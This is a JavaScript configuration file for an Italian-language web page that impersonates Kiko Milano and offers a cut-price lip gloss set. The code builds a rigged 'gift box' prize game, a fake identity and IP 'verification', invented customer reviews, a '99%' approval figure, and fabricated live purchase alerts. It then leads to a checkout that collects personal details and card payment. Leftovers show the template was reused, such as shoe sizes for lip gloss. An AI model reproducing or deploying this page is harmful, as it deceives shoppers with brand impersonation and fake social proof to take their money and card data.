const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

(function (exp) {
  const countryCode = "it";
  const lang = "it-IT";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Taglia : ",
    arr: [
      "EU 36",
      "EU 37",
      "EU 37.5",
      "EU 38",
      "EU 38.5",
      "EU 39",
      "EU 39.5",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 41.5",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 43.5",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 46.5",
      "EU 47",
      "EU 47.5",
      "EU 48",
      "EU 49",
      "EU 50",
      "EU 51",
      "EU 52",
    ],
  };

  const mainProduct = {
    header: "Nuovo | Risparmia 29,00 €",
    name: "Set Hydra 3D per le labbra Kiko Milano",
    oldPrice: "29,00 €",
    newPrice: "9,99 €",
    selectText: "",
    text: `
  
  <b>Gloss lenitivo per le labbra - Kiko Milano 3D Hydra Lipgloss</b>
  <br><br>
  
  <b>Caratteristiche:</b>
  <br>

  - Texture liscia e non appiccicosa;<br>
  - Applicatore in feltro morbido per un'applicazione facile e uniforme<br>
  - Non si insinua nelle fessure e consente una linea precisa<br>
  - Ampia gamma di splendidi colori;<br>
  - Molto resistente;<br>
  - Strati con diversi effetti: trasparente, lucido, perlato, altamente pigmentato ;<br>
  - Contiene un frammento di patrimonio<br>
  - Confezione compatta ed elegante con il logo dell'azienda<br>
  - Testato dermatologicamente.<br>
  <br><br>
  <b>Per usufruire del tuo sconto personalizzato, rispondi a qualche domanda:</b>
  `,
  };

  const notifications = [
    {
      user: "Mia S*****",
      location: "Roma, Italia",
      action: "Ho appena ricevuto un ottimo prodotto per 9,99 € !",
      timeago: "15 secondi fa",
    },
    {
      user: "Ema B******",
      location: "Milano, Italia",
      action: "Ho appena ricevuto un ottimo prodotto per 9,99 € !",
      timeago: "25 secondi fa",
    },
  ];

  const reviewsArr = [
    {
      name: "Lucija",
      time: "1 giorno fa",
      header: "Stile!",
      image: "./assets/r_5.jpg",
      review:
        "Amo questi gloss. Disponibili nei colori più popolari. Hanno una texture molto piacevole e brillano molto sulle labbra. Sono molto soddisfatta.",
    },
    {
      name: "Sara",
      time: "2 giorni fa",
      header: "Kiko sempre super",
      image: "./assets/r_3.jpg",
      review:
        "Questo set è davvero fantastico, i gloss Kiko hanno la migliore texture, buon lucido.",
    },
    {
      name: "Nika",
      time: "3 giorni fa",
      header: "Bel regalo",
      image: "./assets/r_4.jpg",
      review:
        "L'ho ordinato come regalo per mia figlia, desiderava da tempo i gloss Kiko.",
    },
    {
      name: "Marta",
      time: "5 giorni fa",
      header: "Cappello di moda irresistibile!",
      image: "./assets/r_6.jpeg",
      review: "Un meraviglioso set dei colori più popolari di gloss per le labbra.",
    },
    {
      name: "Petra",
      time: "9 giorni fa",
      header: "Niente di meno di quello che mi aspettavo da Kiko.",
      image: "./assets/r_2.jpg",
      review:
        "Non è la prima volta che compro cosmetici Kiko Milano, sempre di alta qualità.",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "RECENSIONI E VALUTAZIONI",
    percent: "99%",
    rec: "raccomandano questo prodotto",
  };

  const questions = {
    _of: "Domanda {1} di {2}:",
    arr: [
      {
        q: "Hai mai usato cosmetici Kiko Milano?",
        a: ["Sì", "No"],
      },
      {
        q: "Quanto spesso usi il gloss per le labbra?",
        a: ["Ogni giorno", "Solo nei giorni festivi", "Dipende dalla situazione"],
      },
      {
        q: "Per chi ordini questo set?",
        a: ["Per me", "Per un amico", "Per un membro della famiglia"],
      },
    ],
  };

  const check = {
    title: "La tua risposta sarà verificata.",
    arr: [
      "Hai risposto alla domanda 3/3.",
      "Il tuo indirizzo IP non permette di trarre conclusioni sulle richieste precedenti.",
      "La tua risposta è stata verificata.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Congratulazioni, hai confermato di essere una persona reale.",
        button: "OK",
        text: `
      <center>
      Oggi, {date}, hai la possibilità di vincere un set Hydra 3D per le labbra Kiko Milano.
        <br><br>
      Tutto quello che devi fare è scegliere la scatola regalo giusta.
        <br><br>
      Hai 3 tentativi, buona fortuna!
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "OK",
        text: `
      <center>
      Sfortunatamente, questa scatola regalo è vuota! Hai ancora 2 tentativi, buona fortuna!
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: "Congratulazioni! Hai vinto!",
        button: "OK",
        text: `
      <center>
        <p style="color: #000">
        Hai vinto un "Set Hydra 3D per le labbra Kiko Milano".
        </p>
        <br>
          1) Clicca su "OK" per accedere alla pagina di consegna.
          <br><br>
          2) Compila il modulo e paga per ricevere il tuo set.
          <br><br>
          3) Il pacco sarà consegnato in 2-3 giorni.
      </center>
    `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Informazioni personali",
      fields: {
        name: {
          field: "Nome",
        },
        family: {
          field: "Cognome",
        },
        phone: {
          field: "Numero di telefono",
        },
        email: {
          field: "E-mail",
        },
      },
    },
    delivery: {
      title: "Consegna",
      fields: {
        city: {
          field: "Città",
        },
        address: {
          field: "Indirizzo di consegna",
        },
        zip: {
          field: "Codice postale",
        },
      },
    },
    payment: {
      title: "Condizioni di pagamento",
      creditCard: "Pagamento online con carta di credito",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Riepilogo dell'ordine",
      oldPrice: "29,00 €",
      newPrice: "9,99 €",
      size: "Taglia",
      subTotal: {
        title: "Valore dell'ordine",
        amount: "9,99 €",
      },
      delivery: {
        title: "Consegna",
        amount: "0,00 €",
      },
      total: {
        title: "Totale",
        amount: "9,99 €",
      },
      checkoutButton: "Effettua il tuo ordine",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "",
      miniImg: "./assets/P_1.webp",
      images: [
        "./assets/P_1.webp",
        "./assets/P_2.webp",
        "./assets/P_3.webp",
        "./assets/P_4.webp",
      ],
    },
  ];

  const footer = {
    cr: "© 2023 Kiko Milano. Tutti i diritti riservati.",
  };

  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
